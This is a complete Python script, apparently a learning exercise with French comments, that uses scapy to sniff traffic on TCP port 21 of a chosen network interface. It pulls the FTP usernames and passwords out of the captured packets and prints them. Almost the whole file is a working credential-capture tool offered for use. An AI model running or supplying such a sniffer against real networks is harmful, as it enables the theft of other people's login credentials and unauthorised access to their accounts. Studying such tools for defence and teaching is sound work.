#!/usr/bin/python3

import optparse
from scapy.all import *
from termcolor import cprint

def ftpSniff(pkt):
	dest = pkt.getlayer(IP).dst #scapy, pour voir la destination du paquet IP
	raw = pkt.sprintf('%Raw.load%') #contenu dans load qui est dans raw
	user = re.findall('(?i)USER (.*)',raw) #1er arg = pattern qui va nous permettre de trouver juste l'username, on cherche l'username dans le paquet raw
	pswd = re.findall('(?i)PASS (.*)',raw) #idem pour le mdp
	if user:
		cprint('[*] Detected FTP login to: ' + str(dest), 'yellow')
		cprint('[+] User account: ' + user[0], 'green') #liste de 1 element
	elif pswd:
		cprint('[+] Password: ' + pswd[0], 'green')

def main():
	parser = optparse.OptionParser('Usage of the program: ' +\
		'-i <interface>')
	parser.add_option('-i', dest='interface', \
		type='string', help='specify interface to listen on')
	(options,args) = parser.parse_args()
	if options.interface == None:
		print(parser.usage)
		exit(0)
	else:
		conf.iface = options.interface #configuration de l'interface pour scapy
	try:
		sniff(filter='tcp port 21', prn=ftpSniff) #prn est la fonction à exécuter quand scapy trouve un paquet correspondant au filtre
	except KeyboardInterrupt:
		exit(0)
main()
